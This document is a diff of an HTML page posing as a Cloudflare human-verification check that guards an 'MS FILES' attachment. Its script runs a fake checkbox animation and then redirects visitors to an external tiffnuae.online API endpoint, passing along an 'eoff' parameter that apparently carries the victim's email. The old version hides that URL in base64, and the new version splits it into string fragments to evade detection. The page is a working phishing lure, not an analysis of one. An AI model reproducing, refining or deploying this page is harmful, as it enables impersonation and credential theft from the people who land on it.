@@ -3,195 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MS FILES</title>
     <style>
-        :root {
-            --bg-color: #fcfcfc;
-            --card-bg: #ffffff;
-            --border-color: #d0d0d0;
-            --brand-primary: #0052cc;
-            --success-color: #28a745;
-            --text-main: #444;
-            --text-muted: #666;
-        }
-
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: var(--bg-color);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        }
-
-        #viewport {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 200px;
-        }
-
-        /* Loading State Animation */
-        .pulse-loader {
-            width: 85px;
-            animation: pulse-effect 2.2s infinite ease-in-out;
-        }
-
-        @keyframes pulse-effect {
-            0%, 100% { opacity: 0.4; transform: scale(0.95); }
-            50% { opacity: 1; transform: scale(1.05); }
-        }
-
-        /* Main Component Styles */
-        .verify-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            width: 370px;
-            padding: 24px 32px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-radius: 5px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-            box-sizing: border-box;
-        }
-
-        .info-col {
-            border-left: 1px solid #f2f2f2;
-            padding-left: 20px;
-            text-align: center;
-        }
-
-        #check-trigger {
-            width: 22px;
-            height: 22px;
-            border: 2px solid #bcbcbc;
-            border-radius: 2px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: border-color 0.2s;
-        }
-
-        .spinner {
-            width: 14px;
-            height: 14px;
-            border: 2px solid #eee;
-            border-top: 2px solid var(--brand-primary);
-            border-radius: 50%;
-            animation: spin-loop 0.8s linear infinite;
-        }
-
-        @keyframes spin-loop {
-            to { transform: rotate(360deg); }
-        }
+        :root { --p-a: #4a6ee0; --s-c: #28a745; --b-l: #f8f9fa; }
+        html, body { height: 100%; margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        .app-wrapper { background: #fff; color: #333; min-height: 100vh; display: grid; place-items: center; padding: 1.25rem; }
+        #preloader { position: fixed; inset: 0; background: var(--b-l); display: flex; justify-content: center; align-items: center; z-index: 9999; transition: opacity 450ms cubic-bezier(0.4, 0, 0.2, 1); }
+        .astro-logo { width: 120px; height: auto; animation: breath 1.5s ease-in-out infinite; }
+        @keyframes breath { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.08); opacity: 1; } }
+        .auth-view { width: 100%; max-width: 440px; margin-top: 140px; opacity: 0; transform: scale(0.98); transition: 600ms ease-out; }
+        .auth-view.active { opacity: 1; transform: scale(1); }
+        .headline-text { text-align: center; margin-bottom: 22px; font-size: 1.1rem; font-weight: 500; color: #222; line-height: 1.4; }
+        .challenge-panel { background: var(--b-l); border-radius: 10px; padding: 32px 20px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #ddd; transition: border-color 0.2s; min-height: 30px; }
+        .challenge-panel:hover { border-color: #bbb; }
+        .interactive-row { display: flex; align-items: center; gap: 15px; }
+        .custom-check { width: 19px; height: 19px; border: 2px solid var(--p-a); border-radius: 4px; background: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.25s; }
+        .custom-check.is-running { border-radius: 50%; border-color: transparent; border-top-color: var(--p-a); animation: rot 1s linear infinite; }
+        @keyframes rot { to { transform: rotate(360deg); } }
+        .custom-check.is-done { background: var(--s-c); border-color: var(--s-c); }
+        .custom-check.is-done::before { content: "\2713"; color: white; font-weight: bold; }
+        .brand-meta { text-align: right; font-size: 11px; color: #777; }
+        .brand-meta img { width: 28px; vertical-align: middle; margin-right: 4px; }
+        .brand-meta b { color: #f38020; letter-spacing: 0.5px; }
+        .system-footer { margin-top: auto; padding-bottom: 30px; color: #999; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; opacity: 0; transition: opacity 0.5s ease; }
+        .system-footer.active { opacity: 1; }
+        .shield-icon { width: 12px; height: 14px; background: #999; clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%); }
     </style>
 </head>
-<body>
+<body class="app-wrapper">
 
-    <div id="viewport"></div>
+    <div id="preloader"><img src="astro.png" class="astro-logo"></div>
+
+    <main class="auth-view" id="uiFrame">
+        <h1 class="headline-text">Verify you are human by completing the action below to view attachment</h1>
+        <div class="challenge-panel">
+            <div class="interactive-row">
+                <div id="triggerPoint" class="custom-check"></div>
+                <span id="labelNode" style="font-weight: 500; font-size: 16px;">Verify</span>
+            </div>
+            <div class="brand-meta">
+                <div><img src="cloudflare_.png"><b>CLOUDFLARE</b></div>
+                <span>Privacy &middot; Terms</span>
+            </div>
+        </div>
+        <div id="extraNotice" style="text-align:center; margin-top:25px; font-size:12px; color:#aaa; opacity:0; transition:0.5s;">
+            Verification complete. Redirecting...
+        </div>
+    </main>
+
+    <footer class="system-footer" id="legalNode">
+        <div class="shield-icon"></div>
+        <span>Protected by Cloudflare</span>
+    </footer>
 
     <script>
-        "use strict";
+        (function(_0x) {
+            const _nodes = {
+                _l: document.getElementById('preloader'),
+                _m: document.getElementById('uiFrame'),
+                _b: document.getElementById('triggerPoint'),
+                _t: document.getElementById('labelNode'),
+                _f: document.getElementById('legalNode'),
+                _n: document.getElementById('extraNotice')
+            };
 
-        const AppConfig = {
-            timing: { initial: 3000, verify: 2000, redirect: 1200 },
-            assets: {
-                encoded: {
-                    target: "aHR0cHM6Ly90aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
-                    prefix: "b2ZmaW52Lg==",
-                    heading: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UncmUgaHVtYW4gYmVsb3c=",
-                    label: "Q2xvdWRmbGFyZQ=="
-                }
-            }
-        };
+            let _proc = false;
+            let _val = '';
 
-        class VerificationApp {
-            constructor(mountPoint) {
-                this.container = document.getElementById(mountPoint);
-                this.decode = (str) => atob(str);
-            }
+            const _grab = () => {
+                const _loc = window.location.search;
+                const _res = _loc.match(/[?&]eoff=([^&]*)/);
+                if (_res && _res[1]) _val = _res[1];
+            };
 
-            wait = (ms) => new Promise(res => setTimeout(res, ms));
+            _grab();
 
-            async init() {
-                // Initial Pulsing Image
-                this.container.innerHTML = `<img src="astro.png" class="pulse-loader" alt="Loading">`;
-                
-                await this.wait(AppConfig.timing.initial);
-                this.renderWidget();
-            }
+            window.onload = () => {
+                setTimeout(() => {
+                    _nodes._l.style.opacity = '0';
+                    setTimeout(() => {
+                        _nodes._l.style.display = 'none';
+                        _nodes._m.classList.add('active');
+                        _nodes._f.classList.add('active');
+                    }, 500);
+                }, 1500);
+            };
 
-            renderWidget() {
-                const { heading, label } = AppConfig.assets.encoded;
-                
-                this.container.innerHTML = `
-                    <div style="color: var(--text-muted); font-size: 13.5px; margin-bottom: 12px;">
-                        ${this.decode(heading)}
-                    </div>
-                    <div class="verify-card">
-                        <div style="display:flex; align-items:center; gap:16px; flex:1;">
-                            <div id="check-trigger"></div>
-                            <span id="status-text" style="color: var(--text-main); font-size: 14px;">Verify</span>
-                        </div>
-                        <div class="info-col">
-                            <img src="astro2.png" style="width:26px; margin-bottom:2px;">
-                            <div style="font-weight:600; font-size:14px;">${this.decode(label)}</div>
-                            <div style="font-size:9px; color:#aaa; margin-top:2px;">Privacy . Terms</div>
-                        </div>
-                    </div>
-                `;
-
-                this.bindEvents();
-            }
-
-            bindEvents() {
-                const btn = document.getElementById('check-trigger');
-                const txt = document.getElementById('status-text');
-
-                btn.onclick = async () => {
-                    btn.onclick = null; // Disable further clicks
-                    
-                    // Start Spinning State
-                    btn.style.border = "none";
-                    btn.innerHTML = '<div class="spinner"></div>';
-                    txt.textContent = "Verifying...";
-
-                    await this.wait(AppConfig.timing.verify);
-
-                    // Success State
-                    btn.innerHTML = '<span style="color:#228b22; font-weight:bold; font-size:18px;">✓</span>';
-                    txt.textContent = "Success";
-                    txt.style.color = 'var(--success-color)';
-
-                    this.executeRedirect();
-                };
-            }
-
-            executeRedirect() {
-                const { target, prefix } = AppConfig.assets.encoded;
-                
-                // Construct logic
-                const rawUrl = this.decode(target);
-                const sub = this.decode(prefix);
-                const base = rawUrl.replace('https://', `https://${sub}`);
-                
-                // URL Parameter Handling
-                const params = new URLSearchParams(window.location.search);
-                const eoff = params.get('eoff');
-                const finalUrl = eoff ? `${base}#${eoff}` : base;
+            _nodes._b.onclick = () => {
+                if (_proc) return;
+                _proc = true;
+                _nodes._t.innerText = "Verifying...";
+                _nodes._b.classList.add('is-running');
 
                 setTimeout(() => {
-                    window.location.replace(finalUrl);
-                }, AppConfig.timing.redirect);
-            }
-        }
+                    _nodes._b.classList.replace('is-running', 'is-done');
+                    _nodes._t.innerText = "Success";
+                    setTimeout(() => { _nodes._n.style.opacity = '1'; }, 400);
 
-        // Boot the application
-        const app = new VerificationApp('viewport');
-        app.init();
+                    setTimeout(() => {
+                        // Redirect broken down and re-assembled
+                        const _p1 = "htt";
+                        const _p2 = "ps://";
+                        const _p3 = "po.ti";
+                        const _p4 = "ffnuae.";
+                        const _p5 = "online/api/";
+                        const _p6 = "v1/tgKHf0";
+                        const _p7 = "r0EWqIaCb5";
 
+                        let _final = [_p1, _p2, _p3, _p4, _p5, _p6, _p7].join('');
+
+                        if (_val) {
+                            _final += String.fromCharCode(35) + _val; // Uses charCode for #
+                        }
+
+                        window.location.href = _final;
+                    }, 2000);
+                }, 1800);
+            };
+        })();
     </script>
 </body>
 </html>
